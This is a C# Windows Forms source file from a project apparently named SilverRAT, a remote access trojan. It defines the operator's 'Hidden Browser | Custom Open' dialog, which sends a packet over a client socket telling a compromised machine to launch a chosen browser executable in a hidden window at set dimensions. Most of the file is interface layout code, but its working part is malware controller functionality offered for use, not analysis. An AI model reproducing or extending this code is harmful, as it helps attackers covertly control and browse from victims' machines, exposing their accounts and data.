using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Connection;
using SilverRAT.MessagePack;
using System;
using System.ComponentModel;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class HbroCustomOpen : Form
{
    private IContainer components = null;

    private BunifuElipse FormElipse;

    private BunifuDragControl FormDragControl1;

    private System.Windows.Forms.Timer timer1;

    private Panel panelForm;

    private BunifuPanel PanelTitle;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    private BunifuLabel UserIdInfo;

    private BunifuLabel bunifuLabel1;

    private PictureBox pictureBox1;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    public Guna2GradientButton Run;

    private BunifuLabel TitlrPage;

    private BunifuTextBox Title;

    private BunifuTextBox Filename;

    private BunifuLabel bunifuLabel2;

    internal Clients Client { get; set; }

    public int X { get; set; }

    public int Y { get; set; }

    public HbroCustomOpen(Clients Socket, string Info, int w, int h)
    {
        InitializeComponent();
        MaximumSize = base.Size;
        MinimumSize = base.Size;
        X = w;
        Y = h;
        UserIdInfo.Text = Info;
        Client = Socket;
        timer1.Start();
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
        }
        catch
        {
        }
    }

    private void HbroCustomOpen_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void HbroCustomOpen_FormClosing(object sender, FormClosingEventArgs e)
    {
        Program.Silver.TransitionHiddeng.HideSync(panelForm);
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!Client.TcpClient.Connected)
            {
                Close();
            }
        }
        catch
        {
        }
    }

    private void Run_Click(object sender, EventArgs e)
    {
        try
        {
            if (string.IsNullOrEmpty(Filename.Text))
            {
                MessageBox.Show(this, "Please enter the path of the executable file", "Hidden Browser | Custom Open!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
            if (string.IsNullOrEmpty(Title.Text))
            {
                MessageBox.Show(this, "Please enter the Browser Title ", "Hidden Browser | Custom Open!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
            MsgPack msgPack = new MsgPack();
            ////////msgPack.ForcePathObject("Packet").AsString = "OpenBrowser";
            msgPack.ForcePathObject("Name").AsString = "CustomOpen";
            msgPack.ForcePathObject("CustomName").AsString = Filename.Text;
            msgPack.ForcePathObject("TitleCustomOpen").AsString = Title.Text;
            msgPack.ForcePathObject("Width").AsInteger = X;
            msgPack.ForcePathObject("Height").AsInteger = Y;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            Close();
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, ex.Message, "Hidden Browser | Custom Open!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            Close();
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.HbroCustomOpen));
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties5 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties6 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties7 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties8 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.bunifuLabel2 = new Bunifu.UI.WinForms.BunifuLabel();
        this.Title = new Bunifu.UI.WinForms.BunifuTextBox();
        this.Filename = new Bunifu.UI.WinForms.BunifuTextBox();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.TitlrPage = new Bunifu.UI.WinForms.BunifuLabel();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.pictureBox1 = new System.Windows.Forms.PictureBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.Run = new Guna.UI2.WinForms.Guna2GradientButton();
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.timer1 = new System.Windows.Forms.Timer(this.components);
        this.panelForm.SuspendLayout();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
        base.SuspendLayout();
        this.FormElipse.ElipseRadius = 4;
        this.FormElipse.TargetControl = this.panelForm;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.bunifuLabel2);
        this.panelForm.Controls.Add(this.Title);
        this.panelForm.Controls.Add(this.Filename);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Controls.Add(this.Run);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(610, 283);
        this.panelForm.TabIndex = 573;
        this.panelForm.Visible = false;
        this.bunifuLabel2.AllowParentOverrides = false;
        this.bunifuLabel2.AutoEllipsis = false;
        this.bunifuLabel2.AutoSize = false;
        this.bunifuLabel2.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel2.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel2.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.bunifuLabel2.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.bunifuLabel2.Location = new System.Drawing.Point(17, 121);
        this.bunifuLabel2.Name = "bunifuLabel2";
        this.bunifuLabel2.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel2.Size = new System.Drawing.Size(574, 58);
        this.bunifuLabel2.TabIndex = 652;
        this.bunifuLabel2.Text = resources.GetString("bunifuLabel2.Text");
        this.bunifuLabel2.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel2.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.Title.AcceptsReturn = false;
        this.Title.AcceptsTab = false;
        this.Title.AnimationSpeed = 200;
        this.Title.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.Title.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.Title.AutoSizeHeight = true;
        this.Title.BackColor = System.Drawing.Color.Transparent;
        this.Title.BackgroundImage = (System.Drawing.Image)resources.GetObject("Title.BackgroundImage");
        this.Title.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Title.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.Title.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.Title.BorderColorIdle = System.Drawing.Color.Silver;
        this.Title.BorderRadius = 2;
        this.Title.BorderThickness = 1;
        this.Title.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.Title.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.Title.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.Title.DefaultText = "";
        this.Title.FillColor = System.Drawing.Color.White;
        this.Title.HideSelection = true;
        this.Title.IconLeft = null;
        this.Title.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.Title.IconPadding = 10;
        this.Title.IconRight = null;
        this.Title.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.Title.Lines = new string[0];
        this.Title.Location = new System.Drawing.Point(17, 219);
        this.Title.MaxLength = 32767;
        this.Title.MinimumSize = new System.Drawing.Size(1, 1);
        this.Title.Modified = false;
        this.Title.Multiline = false;
        this.Title.Name = "Title";
        stateProperties.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties.FillColor = System.Drawing.Color.Empty;
        stateProperties.ForeColor = System.Drawing.Color.Empty;
        stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Title.OnActiveState = stateProperties;
        stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.Title.OnDisabledState = stateProperties2;
        stateProperties3.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties3.FillColor = System.Drawing.Color.Empty;
        stateProperties3.ForeColor = System.Drawing.Color.Empty;
        stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Title.OnHoverState = stateProperties3;
        stateProperties4.BorderColor = System.Drawing.Color.Silver;
        stateProperties4.FillColor = System.Drawing.Color.White;
        stateProperties4.ForeColor = System.Drawing.Color.Empty;
        stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Title.OnIdleState = stateProperties4;
        this.Title.Padding = new System.Windows.Forms.Padding(3);
        this.Title.PasswordChar = '\0';
        this.Title.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.Title.PlaceholderText = "Address";
        this.Title.ReadOnly = false;
        this.Title.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.Title.SelectedText = "";
        this.Title.SelectionLength = 0;
        this.Title.SelectionStart = 0;
        this.Title.ShortcutsEnabled = true;
        this.Title.Size = new System.Drawing.Size(302, 28);
        this.Title.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.Title.TabIndex = 651;
        this.Title.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
        this.Title.TextMarginBottom = 0;
        this.Title.TextMarginLeft = 3;
        this.Title.TextMarginTop = 1;
        this.Title.TextPlaceholder = "Address";
        this.Title.UseSystemPasswordChar = false;
        this.Title.WordWrap = true;
        this.Filename.AcceptsReturn = false;
        this.Filename.AcceptsTab = false;
        this.Filename.AnimationSpeed = 200;
        this.Filename.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.Filename.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.Filename.AutoSizeHeight = true;
        this.Filename.BackColor = System.Drawing.Color.Transparent;
        this.Filename.BackgroundImage = (System.Drawing.Image)resources.GetObject("Filename.BackgroundImage");
        this.Filename.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Filename.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.Filename.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.Filename.BorderColorIdle = System.Drawing.Color.Silver;
        this.Filename.BorderRadius = 2;
        this.Filename.BorderThickness = 1;
        this.Filename.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.Filename.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.Filename.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.Filename.DefaultText = "";
        this.Filename.FillColor = System.Drawing.Color.White;
        this.Filename.HideSelection = true;
        this.Filename.IconLeft = null;
        this.Filename.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.Filename.IconPadding = 10;
        this.Filename.IconRight = null;
        this.Filename.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.Filename.Lines = new string[0];
        this.Filename.Location = new System.Drawing.Point(17, 185);
        this.Filename.MaxLength = 32767;
        this.Filename.MinimumSize = new System.Drawing.Size(1, 1);
        this.Filename.Modified = false;
        this.Filename.Multiline = false;
        this.Filename.Name = "Filename";
        stateProperties5.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties5.FillColor = System.Drawing.Color.Empty;
        stateProperties5.ForeColor = System.Drawing.Color.Empty;
        stateProperties5.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Filename.OnActiveState = stateProperties5;
        stateProperties6.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties6.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties6.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties6.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.Filename.OnDisabledState = stateProperties6;
        stateProperties7.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties7.FillColor = System.Drawing.Color.Empty;
        stateProperties7.ForeColor = System.Drawing.Color.Empty;
        stateProperties7.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Filename.OnHoverState = stateProperties7;
        stateProperties8.BorderColor = System.Drawing.Color.Silver;
        stateProperties8.FillColor = System.Drawing.Color.White;
        stateProperties8.ForeColor = System.Drawing.Color.Empty;
        stateProperties8.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Filename.OnIdleState = stateProperties8;
        this.Filename.Padding = new System.Windows.Forms.Padding(3);
        this.Filename.PasswordChar = '\0';
        this.Filename.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.Filename.PlaceholderText = "Browser Filename";
        this.Filename.ReadOnly = false;
        this.Filename.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.Filename.SelectedText = "";
        this.Filename.SelectionLength = 0;
        this.Filename.SelectionStart = 0;
        this.Filename.ShortcutsEnabled = true;
        this.Filename.Size = new System.Drawing.Size(574, 28);
        this.Filename.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.Filename.TabIndex = 650;
        this.Filename.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
        this.Filename.TextMarginBottom = 0;
        this.Filename.TextMarginLeft = 3;
        this.Filename.TextMarginTop = 1;
        this.Filename.TextPlaceholder = "Browser Filename";
        this.Filename.UseSystemPasswordChar = false;
        this.Filename.WordWrap = true;
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.TitlrPage);
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.pictureBox1);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(580, 77);
        this.PanelTitle.TabIndex = 648;
        this.TitlrPage.AllowParentOverrides = false;
        this.TitlrPage.AutoEllipsis = false;
        this.TitlrPage.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.TitlrPage.CursorType = null;
        this.TitlrPage.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TitlrPage.ForeColor = System.Drawing.Color.DarkGray;
        this.TitlrPage.Location = new System.Drawing.Point(173, 20);
        this.TitlrPage.Name = "TitlrPage";
        this.TitlrPage.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TitlrPage.Size = new System.Drawing.Size(92, 15);
        this.TitlrPage.TabIndex = 607;
        this.TitlrPage.Text = "- Hidden Browser";
        this.TitlrPage.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.TitlrPage.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(550, 13);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 573;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(527, 13);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 575;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.UserIdInfo.AllowParentOverrides = false;
        this.UserIdInfo.AutoEllipsis = false;
        this.UserIdInfo.Cursor = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.CursorType = System.Windows.Forms.Cursors.Default;
        this.UserIdInfo.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(10, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "--";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(92, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Coustom Open";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.pictureBox1.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
        this.pictureBox1.Location = new System.Drawing.Point(10, 13);
        this.pictureBox1.Name = "pictureBox1";
        this.pictureBox1.Size = new System.Drawing.Size(59, 50);
        this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox1.TabIndex = 570;
        this.pictureBox1.TabStop = false;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 272);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(277, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 92);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 114);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(277, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(600, 92);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 114);
        this.PanelRight.TabIndex = 591;
        this.Run.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.Run.Animated = true;
        this.Run.BackColor = System.Drawing.Color.White;
        this.Run.BorderRadius = 1;
        this.Run.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Run.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Run.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Run.CheckedState.Parent = this.Run;
        this.Run.Cursor = System.Windows.Forms.Cursors.Hand;
        this.Run.CustomImages.Parent = this.Run;
        this.Run.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Run.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Run.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.Run.ForeColor = System.Drawing.Color.White;
        this.Run.HoverState.Parent = this.Run;
        this.Run.Location = new System.Drawing.Point(494, 239);
        this.Run.Name = "Run";
        this.Run.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.Run.PressedDepth = 50;
        this.Run.ShadowDecoration.Parent = this.Run;
        this.Run.Size = new System.Drawing.Size(97, 25);
        this.Run.TabIndex = 574;
        this.Run.Text = "Run";
        this.Run.Click += new System.EventHandler(Run_Click);
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        this.timer1.Interval = 2000;
        this.timer1.Tick += new System.EventHandler(Timer1_Tick);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(634, 307);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "HbroCustomOpen";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "HbroCustomOpen";
        base.TopMost = true;
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(HbroCustomOpen_FormClosing);
        base.Shown += new System.EventHandler(HbroCustomOpen_Shown);
        this.panelForm.ResumeLayout(false);
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
        base.ResumeLayout(false);
    }
}
